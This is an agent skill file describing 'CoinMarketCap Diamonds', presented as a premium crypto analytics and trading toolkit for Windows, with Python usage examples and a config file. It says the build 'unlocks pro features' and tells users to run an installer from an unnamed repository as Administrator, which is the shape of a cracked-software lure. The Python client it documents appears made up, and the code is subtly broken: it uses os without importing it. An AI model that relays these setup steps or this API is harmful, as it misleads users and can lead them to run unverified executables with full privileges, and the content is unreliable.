```markdown
---
name: coinmarketcap-diamonds-premium-analytics
description: CoinMarketCap Diamonds premium analytics and trading toolkit for cryptocurrency market data and insights
triggers:
  - analyze cryptocurrency market data with CoinMarketCap Diamonds
  - use CoinMarketCap premium analytics features
  - access CoinMarketCap Diamonds trading tools
  - get crypto market insights with Diamonds
  - set up CoinMarketCap premium analytics
  - work with CoinMarketCap Diamonds API
  - query cryptocurrency data using Diamonds
  - integrate CoinMarketCap premium features
---

# CoinMarketCap Diamonds Premium Analytics

> Skill by [ara.so](https://ara.so) — Data Skills collection.

CoinMarketCap Diamonds is a premium analytics and trading toolkit that provides advanced cryptocurrency market data, real-time tracking, portfolio analysis, and professional trading insights. This build unlocks pro features for comprehensive blockchain and crypto market analytics on Windows.

## Installation

### Windows Setup

1. Download the latest release from the project repository
2. Extract the archive to your preferred installation directory
3. Run the installer executable as Administrator
4. Follow the installation wizard to complete setup

### Environment Configuration

Set up required environment variables:

```bash
# CoinMarketCap API credentials
set CMC_API_KEY=%YOUR_API_KEY%
set CMC_DIAMONDS_LICENSE=%YOUR_LICENSE_KEY%

# Optional: Data cache directory
set CMC_CACHE_DIR=C:\Users\%USERNAME%\AppData\Local\CoinMarketCap\cache

# Optional: Analytics export directory
set CMC_EXPORT_DIR=C:\Users\%USERNAME%\Documents\CoinMarketCap\exports
```

## Core Features

### Market Data Analytics

Access real-time and historical cryptocurrency market data:

- Live price tracking across 10,000+ cryptocurrencies
- Historical OHLCV (Open, High, Low, Close, Volume) data
- Market cap rankings and dominance metrics
- Trading volume analysis across exchanges
- Liquidity and supply metrics

### Premium Trading Tools

- Advanced charting with technical indicators
- Portfolio tracking and performance analysis
- Price alerts and notifications
- Market sentiment analysis
- Whale watching and large transaction tracking

### Blockchain Analytics

- On-chain metrics and network activity
- Token holder distribution analysis
- Smart contract interaction tracking
- DeFi protocol analytics
- NFT market insights

## Usage Patterns

### Basic Market Data Query

```python
import coinmarketcap_diamonds as cmc

# Initialize the client
client = cmc.Client(api_key=os.getenv('CMC_API_KEY'))

# Get current market data for top cryptocurrencies
top_coins = client.get_top_cryptocurrencies(limit=100)

for coin in top_coins:
    print(f"{coin['name']} ({coin['symbol']}): ${coin['price_usd']:.2f}")
    print(f"  24h Change: {coin['percent_change_24h']:.2f}%")
    print(f"  Market Cap: ${coin['market_cap_usd']:,.0f}")
```

### Historical Price Analysis

```python
from datetime import datetime, timedelta

# Get historical data for Bitcoin
btc_history = client.get_historical_data(
    symbol='BTC',
    start_date=datetime.now() - timedelta(days=30),
    end_date=datetime.now(),
    interval='1h'
)

# Calculate moving averages
prices = [candle['close'] for candle in btc_history]
ma_7 = sum(prices[-7:]) / 7
ma_30 = sum(prices[-30:]) / 30

print(f"BTC 7-day MA: ${ma_7:.2f}")
print(f"BTC 30-day MA: ${ma_30:.2f}")
```

### Portfolio Tracking

```python
# Create a portfolio
portfolio = cmc.Portfolio(name="Main Portfolio")

# Add holdings
portfolio.add_holding('BTC', amount=0.5, purchase_price=35000)
portfolio.add_holding('ETH', amount=5.0, purchase_price=2000)
portfolio.add_holding('SOL', amount=100, purchase_price=25)

# Get current portfolio value
current_value = portfolio.get_current_value(client)
total_pnl = portfolio.get_profit_loss(client)

print(f"Portfolio Value: ${current_value:,.2f}")
print(f"Total P&L: ${total_pnl:,.2f} ({total_pnl/portfolio.total_invested*100:.2f}%)")
```

### Market Sentiment Analysis

```python
# Analyze market sentiment for a specific coin
sentiment = client.get_sentiment_analysis('ETH')

print(f"Sentiment Score: {sentiment['score']}/100")
print(f"Social Volume: {sentiment['social_volume']}")
print(f"News Sentiment: {sentiment['news_sentiment']}")
print(f"Trend: {sentiment['trend']}")  # bullish/bearish/neutral
```

### Price Alerts

```python
# Set up price alerts
alert_manager = cmc.AlertManager(client)

# Alert when BTC crosses $50,000
alert_manager.create_alert(
    symbol='BTC',
    condition='price_above',
    threshold=50000,
    notification_method='email',
    email=os.getenv('ALERT_EMAIL')
)

# Alert on 10% price change
alert_manager.create_alert(
    symbol='ETH',
    condition='percent_change_24h',
    threshold=10,
    notification_method='desktop'
)

# Start monitoring
alert_manager.start_monitoring()
```

### Advanced Analytics Export

```python
import json

# Export comprehensive market analysis
analysis = client.get_market_analysis(
    symbols=['BTC', 'ETH', 'BNB', 'SOL', 'ADA'],
    metrics=[
        'price_action',
        'volume_profile',
        'on_chain_metrics',
        'social_sentiment',
        'technical_indicators'
    ]
)

# Export to JSON
export_path = os.path.join(os.getenv('CMC_EXPORT_DIR'), 'market_analysis.json')
with open(export_path, 'w') as f:
    json.dump(analysis, f, indent=2)

print(f"Analysis exported to {export_path}")
```

### On-Chain Metrics Tracking

```python
# Get blockchain network metrics
btc_metrics = client.get_on_chain_metrics('BTC')

print(f"Network Hash Rate: {btc_metrics['hash_rate']} TH/s")
print(f"Active Addresses: {btc_metrics['active_addresses']:,}")
print(f"Transaction Count (24h): {btc_metrics['tx_count_24h']:,}")
print(f"Avg Transaction Fee: ${btc_metrics['avg_tx_fee']:.2f}")

# Track whale movements
whale_txs = client.get_large_transactions(
    symbol='BTC',
    min_value_usd=1000000,
    hours=24
)

print(f"\nLarge BTC Transactions (>$1M) in last 24h: {len(whale_txs)}")
for tx in whale_txs[:5]:
    print(f"  ${tx['value_usd']:,.0f} - {tx['type']} - {tx['timestamp']}")
```

### Exchange Data Analysis

```python
# Compare prices across exchanges
exchange_data = client.get_exchange_prices('BTC')

for exchange, data in exchange_data.items():
    print(f"{exchange}: ${data['price']:.2f} (Vol: ${data['volume_24h']:,.0f})")

# Find arbitrage opportunities
arbitrage = client.find_arbitrage_opportunities(
    symbols=['BTC', 'ETH'],
    min_profit_percent=0.5
)

for opp in arbitrage:
    print(f"\n{opp['symbol']} Arbitrage:")
    print(f"  Buy on {opp['buy_exchange']}: ${opp['buy_price']:.2f}")
    print(f"  Sell on {opp['sell_exchange']}: ${opp['sell_price']:.2f}")
    print(f"  Profit: {opp['profit_percent']:.2f}%")
```

## Configuration

### Settings File

Create `config.json` in the installation directory:

```json
{
  "api": {
    "base_url": "https://pro-api.coinmarketcap.com",
    "timeout": 30,
    "rate_limit": {
      "calls_per_minute": 30,
      "calls_per_day": 10000
    }
  },
  "cache": {
    "enabled": true,
    "ttl_seconds": 60,
    "max_size_mb": 500
  },
  "analytics": {
    "default_currency": "USD",
    "default_timeframe": "1h",
    "auto_refresh_interval": 60
  },
  "alerts": {
    "check_interval_seconds": 30,
    "notification_channels": ["desktop", "email"]
  },
  "export": {
    "default_format": "json",
    "compression": true
  }
}
```

## Common Patterns

### Data Aggregation Pipeline

```python
from datetime import datetime, timedelta

def aggregate_market_data(symbols, days=30):
    """Aggregate comprehensive market data for analysis"""
    client = cmc.Client(api_key=os.getenv('CMC_API_KEY'))
    
    results = {}
    for symbol in symbols:
        # Get historical prices
        history = client.get_historical_data(
            symbol=symbol,
            start_date=datetime.now() - timedelta(days=days),
            end_date=datetime.now()
        )
        
        # Get current metrics
        current = client.get_quote(symbol)
        
        # Get on-chain data
        on_chain = client.get_on_chain_metrics(symbol)
        
        # Calculate technical indicators
        prices = [h['close'] for h in history]
        
        results[symbol] = {
            'current_price': current['price_usd'],
            'price_change_pct': current['percent_change_24h'],
            'market_cap': current['market_cap_usd'],
            'volume_24h': current['volume_24h_usd'],
            'price_history': prices,
            'volatility': calculate_volatility(prices),
            'on_chain': on_chain
        }
    
    return results

def calculate_volatility(prices):
    """Calculate price volatility"""
    import statistics
    returns = [(prices[i] - prices[i-1]) / prices[i-1] for i in range(1, len(prices))]
    return statistics.stdev(returns) * 100
```

### Real-Time Monitoring

```python
import time

def monitor_market(symbols, interval=60):
    """Monitor market in real-time"""
    client = cmc.Client(api_key=os.getenv('CMC_API_KEY'))
    
    while True:
        try:
            quotes = client.get_quotes(symbols)
            
            for symbol, data in quotes.items():
                print(f"\n{symbol}:")
                print(f"  Price: ${data['price_usd']:.2f}")
                print(f"  24h: {data['percent_change_24h']:+.2f}%")
                print(f"  Volume: ${data['volume_24h_usd']:,.0f}")
                
                # Check for significant movements
                if abs(data['percent_change_1h']) > 5:
                    print(f"  ⚠️ ALERT: {data['percent_change_1h']:+.2f}% in 1h")
            
            time.sleep(interval)
            
        except KeyboardInterrupt:
            print("\nMonitoring stopped")
            break
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(interval)
```

## Troubleshooting

### API Rate Limiting

If you encounter rate limit errors:

```python
# Implement retry logic with exponential backoff
import time

def api_call_with_retry(func, max_retries=3):
    for attempt in range(max_retries):
        try:
            return func()
        except cmc.RateLimitError:
            if attempt < max_retries - 1:
                wait_time = 2 ** attempt
                print(f"Rate limited. Waiting {wait_time}s...")
                time.sleep(wait_time)
            else:
                raise
```

### Cache Issues

Clear cache if data appears stale:

```python
# Clear all cached data
client.clear_cache()

# Or clear specific symbol cache
client.clear_cache(symbol='BTC')
```

### Connection Errors

Handle network connectivity issues:

```python
try:
    data = client.get_quote('BTC')
except cmc.ConnectionError as e:
    print(f"Connection failed: {e}")
    print("Check internet connection and API status")
except cmc.APIError as e:
    print(f"API error: {e.message} (Code: {e.code})")
```

### License Validation

If premium features are not accessible:

```python
# Verify license status
license_info = client.verify_license(os.getenv('CMC_DIAMONDS_LICENSE'))

if not license_info['valid']:
    print("License invalid or expired")
    print(f"Expiry: {license_info['expiry_date']}")
else:
    print(f"Premium features active until {license_info['expiry_date']}")
```

## Best Practices

1. **Use environment variables** for API keys and sensitive data
2. **Enable caching** to reduce API calls and improve performance
3. **Implement rate limiting** to stay within API quotas
4. **Handle errors gracefully** with retry logic and fallbacks
5. **Export data regularly** for backup and historical analysis
6. **Monitor API usage** to optimize costs and avoid limits

```
